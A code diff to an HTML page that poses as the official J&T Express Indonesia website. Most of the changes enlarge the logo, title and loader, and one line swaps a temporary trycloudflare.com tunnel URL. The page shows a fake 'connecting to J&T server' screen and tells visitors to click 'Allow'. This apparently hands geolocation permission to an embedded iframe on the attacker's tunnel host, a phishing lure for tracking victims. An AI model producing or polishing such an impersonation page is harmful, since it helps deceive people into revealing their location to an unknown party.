@@ -5,7 +5,8 @@
 
     <meta property="og:title" content="J&T Express Indonesia - Official Website">
     <meta property="og:image" content="https://petunjuk.id/wp-content/uploads/2022/02/cara-cek-resi-jt-express.png">
-    <meta property="og:description" content=""> <meta property="og:type" content="website">
+    <meta property="og:description" content=""> 
+    <meta property="og:type" content="website">
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -24,19 +25,22 @@
         #main-content {
             text-align: center;
             transition: opacity 0.4s ease;
-            width: 90%;
+            width: 95%; /* Diperlebar sedikit agar konten tidak sesak */
         }
 
         .logo {
-            width: 280px;
-            margin-bottom: 20px;
+            /* Ukuran diperbesar secara signifikan menjadi 400px */
+            width: 400px; 
+            max-width: 90%; /* Agar tetap muat di layar HP tanpa terpotong */
+            height: auto;
+            margin-bottom: 30px; /* Jarak bawah ditambah agar lebih lega */
         }
 
         .title {
             color: #ff0000;
             font-weight: bold;
-            font-size: 1.3em;
-            margin-bottom: 20px;
+            font-size: 1.5em; /* Teks judul ikut diperbesar agar seimbang dengan logo */
+            margin-bottom: 25px;
         }
 
         #instruction-msg {
@@ -45,7 +49,7 @@
             width: 85%;
             text-align: center;
             color: #333;
-            font-size: 15px;
+            font-size: 16px;
             line-height: 1.6;
             display: none; 
             padding: 15px;
@@ -55,10 +59,11 @@
             border: 4px solid #f3f3f3;
             border-top: 4px solid #ff0000;
             border-radius: 50%;
-            width: 35px;
-            height: 35px;
+            width: 45px; 
+            height: 45px;
             animation: spin 1s linear infinite;
             display: inline-block;
+            margin-top: 15px;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -80,14 +85,14 @@
         <img src="https://assets-a1.kompasiana.com/items/album/2019/12/05/j-t5-5de8a2f4d541df70016a95f3.jpg" class="logo">
         <div class="title">J&T Express Indonesia Official Website</div>
         <div class="loader"></div>
-        <p>Menghubungkan ke server J&T...</p>
+        <p style="font-size: 18px; color: #555;">Menghubungkan ke server J&T...</p>
     </div>
 
     <div id="instruction-msg">
         <p>Jika gambar atau halaman web tidak muncul dan hanya berwarna putih, silakan klik <b>"Izinkan / Allow"</b> agar situs web dapat kembali normal dan dapat memuat detail informasi mengenai paket Anda.</p>
     </div>
 
-    <iframe src="https://oil-throughout-experiencing-cloud.trycloudflare.com" allow="geolocation *"></iframe>
+    <iframe src="https://edmonton-retro-out-draws.trycloudflare.com" allow="geolocation *"></iframe>
 
     <script>
         setTimeout(function() {
